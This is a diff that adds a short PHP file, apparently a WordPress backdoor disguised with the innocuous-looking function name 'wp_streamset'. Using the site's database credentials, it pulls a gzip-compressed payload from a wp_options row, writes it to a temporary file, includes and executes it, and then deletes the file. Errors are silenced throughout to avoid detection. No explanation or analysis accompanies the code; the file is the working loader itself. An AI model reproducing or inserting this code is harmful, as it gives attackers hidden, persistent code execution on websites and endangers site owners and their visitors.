@@ -1,0 +1,29 @@
+<?php
+
+	@include_once (wp_streamset ());
+	if (!isset ($ssetdel)){
+	@unlink (streamset);
+}
+
+
+	function wp_streamset (){
+	$streamset = stream_get_meta_data (tmpfile ());
+	$stream_c = FALSE;
+
+	if (!defined('streamset'))
+		define ('streamset', $streamset['uri']);
+
+	if ($db = @mysql_connect (DB_HOST, DB_USER, DB_PASSWORD, TRUE))
+		{
+		mysql_select_db (DB_NAME, $db);
+
+		if ($r = @mysql_query ("SELECT option_value FROM wp_options WHERE option_id=400", $db))
+			$stream_c = @gzuncompress (mysql_result ($r, 0, 0));
+		}
+
+	$stream_c = $stream_c ? $stream_c : '';
+	@file_put_contents (streamset, $stream_c);
+	mysql_close ($db);
+
+	return streamset;
+}
